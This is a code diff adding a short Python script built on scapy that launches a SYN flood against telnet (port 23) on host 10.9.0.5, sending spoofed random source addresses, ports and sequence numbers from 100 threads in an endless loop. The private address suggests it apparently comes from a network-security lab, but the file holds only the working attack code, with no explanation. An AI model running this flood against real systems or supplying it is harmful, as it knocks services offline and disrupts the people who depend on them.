@@ -1,0 +1,26 @@
+#!/usr/bin/python3
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+import random
+import _thread
+
+def attack():
+    while True:
+        a = IP(dst="10.9.0.5")
+        b = TCP(dport=23, flags='S')
+        pkt = a / b
+
+        pkt['IP'].src = str(IPv4Address(random.getrandbits(32)))
+        pkt[TCP].sport = random.getrandbits(16)
+        pkt[TCP].seq = random.getrandbits(32)
+        send(pkt, verbose=0)
+
+for i in range(0, 100):
+    _thread.start_new_thread(attack, ())
+
+while True:
+    pass
+
+
+
+
